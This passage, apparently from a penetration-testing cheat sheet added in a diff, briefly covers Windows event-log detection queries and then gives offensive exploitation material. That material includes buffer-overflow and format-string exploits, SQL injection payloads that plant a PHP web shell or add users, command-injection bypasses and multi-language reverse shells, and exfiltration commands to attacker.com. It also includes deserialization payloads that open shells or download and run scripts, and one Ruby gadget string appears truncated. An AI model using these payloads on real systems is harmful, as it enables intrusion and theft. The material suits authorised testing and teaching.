+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4732} | Select-Object TimeCreated, @{Name="TargetUser";Expression={$_.Properties[0].Value}}, @{Name="MemberName";Expression={$_.Properties[2].Value}}
+```
+
+Sensitive privilege usage (Event ID 4673):
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4673} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[1].Value}}, @{Name="Privilege";Expression={$_.Properties[3].Value}}
+```
+
+**Process Execution Logging**
+
+Enable Process Creation Auditing (Event ID 4688):
+
+```powershell
+auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
+```
+
+Query process creation events:
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Select-Object TimeCreated, @{Name="CommandLine";Expression={$_.Properties[8].Value}}, @{Name="User";Expression={$_.Properties[1].Value}}
+```
+
+High-risk process execution:
+
+```powershell
+$riskProcesses = @("powershell.exe", "cmd.exe", "cscript.exe", "wscript.exe", "msiexec.exe", "regsvcs.exe", "sc.exe", "net.exe")
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Where-Object {$riskProcesses -contains ($_.Properties[5].Value -split '\\')[-1]} | Select-Object TimeCreated, @{Name="Process";Expression={$_.Properties[5].Value}}, @{Name="CommandLine";Expression={$_.Properties[8].Value}}
+```
+
+**PowerShell Logging Analysis**
+
+PowerShell Module Logging (Event ID 4103):
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell'; ID=4103} | Select-Object TimeCreated, @{Name="HostName";Expression={$_.Properties[2].Value}}, @{Name="CommandPath";Expression={$_.Properties[4].Value}}
+```
+
+PowerShell ScriptBlock Logging (Event ID 4104):
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object TimeCreated, @{Name="ScriptBlock";Expression={$_.Properties[2].Value}}
+```
+
+**Object Access and File System Events**
+
+File share access (Event ID 5140):
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5140} | Select-Object TimeCreated, @{Name="ObjectName";Expression={$_.Properties[3].Value}}, @{Name="AccessList";Expression={$_.Properties[4].Value}}
+```
+
+**Event Log Export and Analysis**
+
+Export logs for external analysis:
+
+```powershell
+Get-EventLog -LogName Security -Newest 10000 | Export-Csv security_events.csv
+Get-WinEvent -LogName Security -MaxEvents 10000 | Export-Csv security_events.csv
+wevtutil export-log Security security.evtx
+```
+
+Offline analysis using Event Log Explorer or similar tools for timeline reconstruction.
+
+**Event Log Tampering Detection**
+
+Verify log integrity and identify clearing events (Event ID 1102):
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=1102} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[1].Value}}, @{Name="LogName";Expression={$_.Properties[0].Value}}
+```
+
+**Event Log Retention Policy**
+
+```powershell
+Get-EventLog -List | Select-Object Log, MaximumKilobytes, MinimumRetentionDays
+```
+
+Identify if log rotation is configured, indicating whether historical events are preserved.
+
+---
+
+# Remote Access via Exploitation
+
+## Buffer Overflow Exploitation
+
+### Stack-Based Buffer Overflows
+
+**Basic Vulnerability Identification**
+
+```bash
+# Check for stack protection mechanisms
+checksec --file=<binary>
+readelf -l <binary> | grep GNU_STACK
+rabin2 -I <binary>  # Radare2
+```
+
+**Protection Mechanisms Detection**
+
+```bash
+# NX (Non-Executable Stack)
+readelf -l <binary> | grep -E 'GNU_STACK|RW '
+
+# Stack Canaries
+objdump -d <binary> | grep stack_chk_fail
+
+# ASLR (Address Space Layout Randomization)
+cat /proc/sys/kernel/randomize_va_space  # 0=off, 1=conservative, 2=full
+
+# PIE (Position Independent Executable)
+readelf -h <binary> | grep Type
+checksec --file=<binary> | grep PIE
+
+# RELRO (Relocation Read-Only)
+readelf -l <binary> | grep GNU_RELRO
+```
+
+**Manual Fuzzing for Buffer Overflows**
+
+```bash
+# Pattern generation for offset calculation
+msf-pattern_create -l 500
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
+
+# Pattern offset identification
+msf-pattern_offset -q <value>
+msf-pattern_offset -l 500 -q 0x41384141
+```
+
+**GDB Debugging for Exploitation**
+
+```bash
+# Basic debugging setup
+gdb ./vulnerable_program
+gdb -q ./vulnerable_program
+
+# GDB with PEDA/GEF/pwndbg
+gdb -q ./program
+source /path/to/peda.py
+
+# Run with input
+r $(python -c 'print "A"*100')
+r < <(python -c 'print "A"*100')
+
+# Key GDB commands
+info registers  # Register values
+info frame  # Stack frame information
+x/100x $esp  # Examine stack
+x/20i $eip  # Disassemble at EIP
+backtrace  # Call stack
+
+# Finding offset to EIP/RIP
+pattern create 500
+r $(pattern create 500)
+pattern offset $eip
+```
+
+**Return-to-libc Exploitation**
+
+```bash
+# Find system() address
+gdb ./program
+break main
+r
+p system
+p exit
+
+# Find "/bin/sh" string
+strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+grep -oba '/bin/sh' /lib/i386-linux-gnu/libc.so.6
+
+# Get libc base address
+ldd ./program
+cat /proc/<PID>/maps | grep libc
+```
+
+**ROP (Return-Oriented Programming) Chains**
+
+```bash
+# Find ROP gadgets
+ROPgadget --binary ./program
+ropper --file ./program
+ropper --file ./program --search "pop rdi"
+
+# Specific gadget searches
+ROPgadget --binary ./program --only "pop|ret"
+ROPgadget --binary ./program --string "/bin/sh"
+
+# One-shot ROP gadgets (one_gadget tool)
+one_gadget /lib/x86_64-linux-gnu/libc.so.6
+```
+
+**Shellcode Development**
+
+```bash
+# Generate shellcode
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f python -b '\x00\x0a\x0d'
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -b '\x00'
+
+# Test shellcode
+msfvenom -p linux/x86/exec CMD=/bin/sh -f raw | ndisasm -u -
+
+# Common bad characters to avoid
+\x00  # Null byte
+\x0a  # Line feed
+\x0d  # Carriage return
+\x20  # Space
+```
+
+**Exploit Template (Python pwntools)**
+
+```python
+from pwn import *
+
+# Context
+context.arch = 'amd64'
+context.os = 'linux'
+
+# Connection
+p = process('./vulnerable')
+# p = remote('target.com', 1337)
+
+# Payload construction
+offset = 112
+ret_addr = p64(0xdeadbeef)
+payload = b'A' * offset + ret_addr
+
+# Send exploit
+p.sendline(payload)
+p.interactive()
+```
+
+**Heap Overflow Exploitation Basics**
+
+```bash
+# Heap analysis with GDB
+gdb ./program
+heap chunks  # With gef/peda
+vis_heap_chunks  # Visualize heap
+
+# malloc debugging
+export MALLOC_CHECK_=3
+export MALLOC_PERTURB_=1
+
+# Heap exploitation techniques
+# - Use-After-Free (UAF)
+# - Double Free
+# - Heap Spraying
+# - tcache poisoning (glibc 2.26+)
+# - fastbin dup
+```
+
+### Practical Buffer Overflow Steps
+
+**Step 1: Crash the Application**
+
+```bash
+python -c 'print "A"*1000' | ./vulnerable
+```
+
+**Step 2: Find Offset**
+
+```bash
+# Generate unique pattern
+msf-pattern_create -l 1000 > pattern.txt
+gdb ./vulnerable
+r < pattern.txt
+# Note EIP value
+msf-pattern_offset -q <EIP_value> -l 1000
+```
+
+**Step 3: Control EIP**
+
+```bash
+python -c 'print "A"*<offset> + "BBBB"' | ./vulnerable
+# Verify EIP = 0x42424242
+```
+
+**Step 4: Find Space for Shellcode**
+
+```bash
+# Check stack space after EIP
+python -c 'print "A"*<offset> + "BBBB" + "C"*400' | ./vulnerable
+# Examine stack in GDB
+```
+
+**Step 5: Execute Shellcode**
+
+```bash
+# JMP ESP gadget technique
+objdump -d ./vulnerable | grep 'jmp.*esp'
+msf-nasm_shell
+nasm > jmp esp
+# Use address of JMP ESP instruction
+```
+
+## Format String Vulnerabilities
+
+### Identification and Reconnaissance
+
+**Basic Detection**
+
+```bash
+# Test inputs
+%x %x %x %x
+%p %p %p %p
+%s %s %s %s
+AAAA%p%p%p%p
+
+# Remote testing
+printf "AAAA%%x%%x%%x%%x\n" | nc target.com 9999
+```
+
+**Source Code Indicators**
+
+```c
+// Vulnerable patterns
+printf(user_input);
+sprintf(buffer, user_input);
+fprintf(file, user_input);
+snprintf(buffer, size, user_input);
+syslog(priority, user_input);
+```
+
+### Information Disclosure
+
+**Stack Reading**
+
+```bash
+# Direct parameter access
+%<n>$x   # Read nth parameter as hex
+%<n>$s   # Read nth parameter as string
+%<n>$p   # Read nth parameter as pointer
+
+# Example: Read 10th stack position
+%10$x
+%10$p
+```
+
+**Finding Format String Offset**
+
+```bash
+# Using unique identifier
+AAAA%x.%x.%x.%x.%x.%x.%x.%x
+# Look for 41414141 (AAAA in hex)
+
+# Automated with script
+for i in {1..20}; do echo "%$i\$x"; done
+```
+
+**Memory Leak Exploitation**
+
+```bash
+# Leak libc addresses
+%<n>$s where <n> points to GOT entry
+%3$s  # Read string at 3rd parameter
+
+# Leak stack canary
+%<n>$p where <n> is canary position
+```
+
+### Arbitrary Write Primitives
+
+**Using %n Specifier**
+
+```c
+// %n writes number of bytes printed so far
+printf("AAAA%n", &variable);  // Writes 4 to variable
+```
+
+**Write-What-Where Technique**
+
+```bash
+# Basic format
+[address]%<value>x%<offset>$n
+
+# Example: Write 0x08040404 to address 0xbffff7a0
+python -c 'print "\xa0\xf7\xff\xbf" + "%134520796x" + "%4$n"'
+```
+
+**Partial Overwrites with %hn and %hhn**
+
+```bash
+# %hn writes 2 bytes (short)
+# %hhn writes 1 byte (byte)
+
+# Overwrite GOT entry
+[addr][addr+2]%<value1>x%<offset>$hn%<value2>x%<offset+1>$hn
+```
+
+**Automated Format String Exploitation**
+
+```python
+from pwn import *
+
+# FmtStr helper
+def send_payload(payload):
+    p = process('./vulnerable')
+    p.sendline(payload)
+    return p.recvall()
+
+# Automatic exploitation
+autofmt = FmtStr(send_payload)
+offset = autofmt.offset
+
+# Write to arbitrary address
+payload = fmtstr_payload(offset, {target_addr: target_value})
+```
+
+### Format String Attack Patterns
+
+**GOT Overwrite**
+
+```bash
+# 1. Find format string offset
+AAAA%x%x%x%x%x%x  # Look for 41414141
+
+# 2. Get target function GOT address
+objdump -R ./binary | grep printf
+readelf -r ./binary
+
+# 3. Craft payload to overwrite GOT
+python -c 'print "[GOT_addr]" + "%<calculated>x%<offset>$n"'
+```
+
+**Stack Canary Leak and Bypass**
+
+```bash
+# Leak canary value
+%<canary_offset>$p
+
+# Use leaked value in exploit
+payload = b'A'*offset + leaked_canary + padding + ret_addr
+```
+
+**ASLR Bypass via Format String**
+
+```bash
+# Leak stack/libc addresses
+%<offset>$p  # Stack pointer
+%<offset>$s  # Dereference for libc address
+
+# Calculate base addresses
+libc_base = leaked_addr - function_offset
+```
+
+### Practical Format String Tools
+
+**pwntools Format String Module**
+
+```python
+from pwn import *
+
+context.binary = './vulnerable'
+
+def exec_fmt(payload):
+    p = process('./vulnerable')
+    p.sendline(payload)
+    return p.recvall()
+
+# Automatic format string exploitation
+fmt = FmtStr(exec_fmt)
+offset = fmt.offset
+
+# Write primitive
+payload = fmtstr_payload(offset, {0x0804a020: 0x41414141})
+```
+
+**Manual Format String Script**
+
+```python
+#!/usr/bin/env python3
+import struct
+
+def p32(addr):
+    return struct.pack("<I", addr)
+
+target = 0x0804a024
+value = 0xdeadbeef
+offset = 4
+
+# Split value into two shorts
+low = value & 0xffff
+high = (value >> 16) & 0xffff
+
+payload = p32(target) + p32(target + 2)
+payload += f"%{low - 8}x%{offset}$hn"
+payload += f"%{high - low}x%{offset + 1}$hn"
+```
+
+## Injection Attacks
+
+### SQL Injection
+
+**Basic SQL Injection Testing**
+
+```sql
+-- Authentication bypass
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+admin'--
+admin' #
+
+-- Boolean-based detection
+' AND 1=1 --
+' AND 1=2 --
+
+-- Time-based detection
+' AND SLEEP(5) --
+' OR IF(1=1, SLEEP(5), 0) --
+'; WAITFOR DELAY '00:00:05' --  -- MSSQL
+```
+
+**Union-Based SQL Injection**
+
+```sql
+-- Determine column count
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --  -- Continue until error
+
+-- Alternative column count detection
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+
+-- Extract data
+' UNION SELECT username,password FROM users --
+' UNION SELECT NULL,table_name FROM information_schema.tables --
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users' --
+```
+
+**Error-Based SQL Injection**
+
+```sql
+-- MySQL
+' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e)) --
+' AND updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) --
+
+-- MSSQL
+' AND 1=CONVERT(int,(SELECT @@version)) --
+
+-- PostgreSQL
+' AND CAST((SELECT version()) AS int) --
+```
+
+**Blind SQL Injection**
+
+```sql
+-- Boolean-based
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
+' AND ASCII(SUBSTRING((SELECT database()),1,1))=115 --
+
+-- Time-based
+' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0) --
+' OR IF((SELECT COUNT(*) FROM users)>1,SLEEP(5),0) --
+```
+
+**SQL Injection for Remote Code Execution**
+
+```sql
+-- MySQL
+' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --
+' UNION SELECT load_file('/etc/passwd') --
+
+-- MSSQL (xp_cmdshell)
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+'; EXEC xp_cmdshell 'net user hacker password123 /add' --
+
+-- PostgreSQL
+'; CREATE TABLE cmd_exec(cmd_output text); --
+'; COPY cmd_exec FROM PROGRAM 'id'; --
+'; SELECT * FROM cmd_exec; --
+```
+
+**SQLMap Automation**
+
+```bash
+# Basic scan
+sqlmap -u "http://target.com/page?id=1"
+
+# With POST data
+sqlmap -u "http://target.com/login" --data="username=admin&password=pass"
+
+# Database enumeration
+sqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump
+
+# OS shell
+sqlmap -u "http://target.com/page?id=1" --os-shell
+
+# File read/write
+sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Tamper scripts for WAF bypass
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
+sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase
+
+# Advanced options
+sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --threads=10
+sqlmap -u "http://target.com/page?id=1" --batch --random-agent
+```
+
+**Manual SQL Injection Payloads**
+
+```sql
+-- MySQL version detection
+' UNION SELECT @@version,NULL,NULL --
+' AND 1=2 UNION SELECT @@version --
+
+-- Current database
+' UNION SELECT database(),NULL,NULL --
+
+-- List databases
+' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata --
+
+-- List tables
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() --
+
+-- List columns
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
+
+-- Extract data
+' UNION SELECT username,password,email FROM users --
+
+-- Dump in one query
+' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM users --
+```
+
+### Command Injection
+
+**Basic Command Injection Payloads**
+
+```bash
+# Command separators
+;ls
+|ls
+||ls
+&ls
+&&ls
+`ls`
+$(ls)
+
+# Newline injection
+%0als
+%0d%0als
+
+# Command substitution
+`whoami`
+$(whoami)
+```
+
+**Bypass Filters and WAF**
+
+```bash
+# Space bypass
+{cat,/etc/passwd}
+cat</etc/passwd
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+X=$'cat\x20/etc/passwd'&&$X
+
+# Quote and escape variations
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+c${u}at /etc/passwd
+
+# Wildcard usage
+cat /etc/pass??
+cat /etc/pass*
+/bin/c?t /etc/passwd
+
+# Hex encoding
+$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
+
+# Base64 encoding
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+
+# Variable expansion
+u=ca;t=t;$u$t /etc/passwd
+```
+
+**Reverse Shell via Command Injection**
+
+```bash
+# Bash TCP reverse shell
+;bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+;bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
+
+# Netcat reverse shell
+;nc -e /bin/bash <IP> <PORT>
+;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
+
+# Python reverse shell
+;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PHP reverse shell
+;php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Perl reverse shell
+;perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+**Blind Command Injection Detection**
+
+```bash
+# Time-based detection
+;sleep 10
+;ping -c 10 127.0.0.1
+;timeout 10
+
+# DNS exfiltration
+;nslookup $(whoami).attacker.com
+;dig $(hostname).attacker.com
+;curl http://$(whoami).attacker.com
+
+# HTTP exfiltration
+;curl http://attacker.com/?data=$(whoami|base64)
+;wget http://attacker.com/?data=$(cat /etc/passwd|base64)
+```
+
+**Command Injection Testing Methodology**
+
+```bash
+# 1. Identify injection point
+param=value;whoami
+
+# 2. Test separators
+param=value;whoami
+param=value|whoami
+param=value||whoami
+
+# 3. Bypass filtering
+param=value;w'h'o'a'm'i
+param=value;$(whoami)
+
+# 4. Establish callback
+param=value;curl http://attacker.com/$(whoami)
+
+# 5. Full exploitation
+param=value;bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+```
+
+**Commix Tool (Automated Command Injection)**
+
+```bash
+# Basic scan
+commix -u "http://target.com/page?param=value"
+
+# POST parameter
+commix -u "http://target.com/page" --data="param=value"
+
+# Custom injection marker
+commix -u "http://target.com/page?param=INJECT_HERE"
+
+# OS shell
+commix -u "http://target.com/page?param=value" --os-shell
+
+# File access
+commix -u "http://target.com/page?param=value" --file-read="/etc/passwd"
+commix -u "http://target.com/page?param=value" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Specific technique
+commix -u "http://target.com/page?param=value" --technique=t  # time-based
+```
+
+### LDAP Injection
+
+**Basic LDAP Injection**
+
+```ldap
+# Authentication bypass
+*
+*)(&
+*)(|(objectClass=*
+admin)(&
+admin*)(&(password=*)
+
+# LDAP filter injection
+(&(uid=*)(password=*))
+(&(uid=admin)(password=*))
+(|(uid=*)(uid=admin))
+```
+
+**LDAP Injection Patterns**
+
+```ldap
+# Wildcard usage
+*
+*)(uid=*)
+*))%00
+
+# Boolean logic
+admin*)(&
+admin)(&(password=*
+admin)(|(password=*)(password=*
+
+# Comment out rest of query
+admin)%00
+admin))%00
+```
+
+**LDAP Attribute Enumeration**
+
+```ldap
+# Extract attributes
+*)(&(objectClass=*)(attribute=*
+*)(&(objectClass=user)(userPassword=*
+
+# Blind enumeration
+admin*
+admina*
+adminb*
+# Continue until match found
+```
+
+**LDAP Injection Tools**
+
+```bash
+# ldapsearch manual testing
+ldapsearch -x -H ldap://target.com -D "uid=admin,ou=users,dc=target,dc=com" -w "password" -b "dc=target,dc=com" "(uid=*)"
+
+# Burp Intruder payloads
+*
+*)(&
+*)(|(objectClass=*
+admin)(&
+```
+
+### XPath Injection
+
+**Basic XPath Injection**
+
+```xpath
+# Authentication bypass
+' or '1'='1
+' or 1=1 or 'a'='a
+' or ''='
+
+# Node extraction
+'] | //* | a['a'='a
+'] | //user/* | a['a'='a
+```
+
+**XPath Enumeration**
+
+```xpath
+# Count nodes
+' and count(/*)=1 and '1'='1
+' and count(//*)>10 and '1'='1
+
+# String extraction
+' and substring(//user[1]/password,1,1)='a' and '1'='1
+' and string-length(//user[1]/password)=8 and '1'='1
+
+# Blind extraction via substring
+' and substring(//user[1]/password,1,1)='a' and '1'='1  # True/False
+```
+
+**XPath Injection for Data Extraction**
+
+```xpath
+# Extract all users
+'] | //user | a['a'='a
+
+# Extract specific attributes
+'] | //user/username | a['a'='a
+'] | //user/password | a['a'='a
+
+# Boolean-based enumeration
+' and //user[1]/username='admin' and '1'='1
+' and starts-with(//user[1]/password,'a') and '1'='1
+```
+
+## Deserialization Vulnerabilities
+
+### PHP Object Injection
+
+**Basic PHP Serialization**
+
+```php
+// Serialization
+$obj = new User("admin", "password");
+$serialized = serialize($obj);
+// Output: O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"password";s:8:"password";}
+
+// Unserialization (vulnerable)
+$obj = unserialize($_GET['data']);
+```
+
+**PHP Deserialization Payloads**
+
+```php
+// Magic methods exploitation
+__wakeup()
+__destruct()
+__toString()
+
+// Example payload
+O:8:"EvilUser":1:{s:7:"command";s:6:"whoami";}
+
+// File read payload
+O:8:"FileRead":1:{s:4:"file";s:15:"/etc/passwd";}
+```
+
+**PHP Gadget Chains**
+
+```bash
+# PHPGGC tool for gadget generation
+phpggc -l  # List available gadgets
+phpggc Symfony/RCE4 system 'whoami'
+phpggc Laravel/RCE1 system id
+phpggc Monolog/RCE1 system 'nc -e /bin/bash attacker.com 4444'
+
+# Encode payload
+phpggc Symfony/RCE4 system 'whoami' -b  # Base64
+phpggc Symfony/RCE4 system 'whoami' -u  # URL-encode
+phpggc Symfony/RCE4 system 'whoami' -j  # JSON
+```
+
+**PHP Object Injection via Phar**
+
+```php
+// Phar deserialization
+file_exists('phar://exploit.phar');
+file_get_contents('phar://exploit.phar');
+include('phar://exploit.phar');
+
+// Generate malicious phar
+<?php
+class Exploit {
+    public $cmd = 'system';
+    public $arg = 'whoami';
+}
+$phar = new Phar('exploit.phar');
+$phar->startBuffering();
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->setMetadata(new Exploit());
+$phar->addFromString('test.txt', 'test');
+$phar->stopBuffering();
+?>
+```
+
+### Java Deserialization
+
+**Identifying Java Deserialization**
+
+```bash
+# Java serialization magic bytes
+AC ED 00 05  # Start of serialized Java object
+rO0AB  # Base64 encoded serialized object
+
+# Common vulnerable libraries
+commons-collections
+commons-fileupload
+groovy
+spring-core
+```
+
+**ysoserial for Java Exploitation**
+
+```bash
+# List available payloads
+java -jar ysoserial.jar
+
+# Generate payload
+java -jar ysoserial.jar CommonsCollections1 'whoami'
+java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,BASE64}|{base64,-d}|{bash,-i}'
+
+# Common payload types
+java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/bash attacker.com 4444'
+java -jar ysoserial.jar CommonsCollections6 'wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh'
+java -jar ysoserial.jar Groovy1 'curl http://attacker.com/$(whoami)'
+
+# Encode for transmission
+java -jar ysoserial.jar CommonsCollections1 'whoami' | base64
+java -jar ysoserial.jar CommonsCollections1 'whoami' | xxd -p | tr -d '\n'
+```
+
+**Java Deserialization Testing**
+
+```bash
+# Burp Collaborator interaction
+java -jar ysoserial.jar CommonsCollections1 'nslookup $(whoami).burpcollaborator.net'
+
+# Time-based detection
+java -jar ysoserial.jar CommonsCollections1 'sleep 10'
+java -jar ysoserial.jar CommonsCollections1 'ping -c 10 127.0.0.1'
+
+# HTTP callback
+java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/callback'
+```
+
+**JexBoss Tool (JBoss Exploitation)**
+
+```bash
+# Scan for vulnerabilities
+python jexboss.py -u http://target.com
+
+# Auto-exploit
+python jexboss.py -u http://target.com -auto-exploit
+
+# Specific module
+python jexboss.py -u http://target.com -M jmx-console
+```
+
+### Python Pickle Deserialization
+
+**Basic Pickle Exploitation**
+
+```python
+import pickle
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+
+payload = pickle.dumps(Exploit())
+print(payload)
+
+# Vulnerable code
+import pickle
+data = pickle.loads(payload)  # Executes command
+```
+
+**Pickle RCE Payloads**
+
+```python
+# Reverse shell
+import pickle
+import os
+
+class ReverseShell:
+    def __reduce__(self):
+        cmd = "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"
+        return (os.system, (cmd,))
+
+payload = pickle.dumps(ReverseShell())
+
+# Alternative using subprocess
+import subprocess
+
+class Exploit:
+    def __reduce__(self):
+        return (subprocess.Popen, (['/bin/bash', '-c', 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'],))
+```
+
+**Pickle Opcode Injection**
+
+```python
+# Raw pickle opcodes
+import pickletools
+
+payload = b"""cos
+system
+(S'whoami'
+tR."""
+
+pickletools.dis(payload)
+```
+
+### .NET Deserialization
+
+**ysoserial.net Usage**
+
+```bash
+# List available gadgets
+ysoserial.exe -l
+
+# Generate payload
+ysoserial.exe -g ObjectDataProvider -f Json -c "calc.exe"
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -enc BASE64"
+
+# Common gadgets
+ysoserial.exe -g ObjectDataProvider -f Json -c "cmd /c whoami"
+ysoserial.exe -g PSObject -f BinaryFormatter -c "net user hacker Pass123! /add"
+```
+
+**ViewState Exploitation**
+
+```bash
+# Decode ViewState
+echo "<viewstate>" | base64 -d | xxd
+
+# Generate malicious ViewState
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -enc BASE64" --path="/page.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<key>" --validationalg="HMACSHA256" --validationkey="<key>"
+
+# ViewState without MAC validation
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc.exe" --islegacy --isencrypted
+```
+
+### Node.js Deserialization
+
+**node-serialize Exploitation**
+
+```javascript
+// Vulnerable code
+var serialize = require('node-serialize');
+var payload = serialize.unserialize(user_input);
+
+// Exploit payload
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(error, stdout, stderr){console.log(stdout)});}()"}
+
+// Reverse shell
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"', function(error, stdout, stderr){console.log(stdout)});}()"}
+```
+
+**funcster Exploitation**
+
+```javascript
+// Payload format
+{"__js_function":"function(){return require('child_process').execSync('whoami').toString()}"}
+```
+
+### Testing for Deserialization Vulnerabilities
+
+**Detection Methods**
+
+```bash
+# 1. Identify serialized data format
+AC ED 00 05        # Java
+rO0AB             # Java Base64
+O:4:"User"        # PHP
+{"__type":        # .NET JSON
+_$$ND_FUNC$$_     # Node.js
+
+# 2. Test for callback
+# Use Burp Collaborator or custom listener
+nslookup $(whoami).burpcollaborator.net
+curl http://attacker.com/$(whoami)
+
+# 3. Time-based detection
+sleep 10
+ping -c 10
+```
+
+## Deserialization Vulnerabilities (Continued)
+
+### Ruby Deserialization
+
+**Marshal/YAML Exploitation**
+
+```ruby
+# Marshal deserialization (binary format)
+# Vulnerable code
+data = Marshal.load(user_input)
+
+# Exploit using universal deserializer gadget
+# Ruby 2.x Universal RCE gadget
+payload = "\x04\x08o:\x1bGem::Requirement[\x06o:\x1aGem::DependencyList[\x06o:\x15Gem::Package::TarReader"
+```
+
+**YAML Deserialization**
+
+```ruby
+# Vulnerable code
+require 'yaml'
+YAML.load(user_input)
+
+# Exploit payload
+--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::SpecFetcher
+i: y
+
+# Command execution payload
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::DependencyList
+  specs:
+  - !ruby/object:Gem::Source
+    current_user_dir: /tmp
+  - !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"
+         method_id: :resolve
+```
+
+**YAML.safe_load Bypass Attempts**
+
+```ruby
+# Test for unsafe classes allowed
+--- !ruby/object:Gem::Installer
+--- !ruby/object:Gem::Requirement
+--- !ruby/hash:ExploitClass
+
+# Symbol DoS (Denial of Service)
+--- !ruby/symbol :testing_symbol
+```
+
+### Testing Methodology for Deserialization
+
+**Step 1: Identify Serialization Format**
+
+```bash
+# Check HTTP headers
+Content-Type: application/x-java-serialized-object
+Content-Type: application/x-php-serialized
+X-Java-Serialized-Object: true
+
+# Examine cookies
+JSESSIONID with AC ED 00 05 prefix
+PHPSESSIDwith serialized PHP format
+
+# Check parameters
+base64 -d <<< "rO0AB..." | xxd | head
+echo "O:4:..." # PHP format visible
+```
+
+**Step 2: Fingerprint Libraries/Framework**
+
+```bash
+# Java: Look for stack traces or error messages
+commons-collections version
+Spring Framework version
+Apache Commons version
+
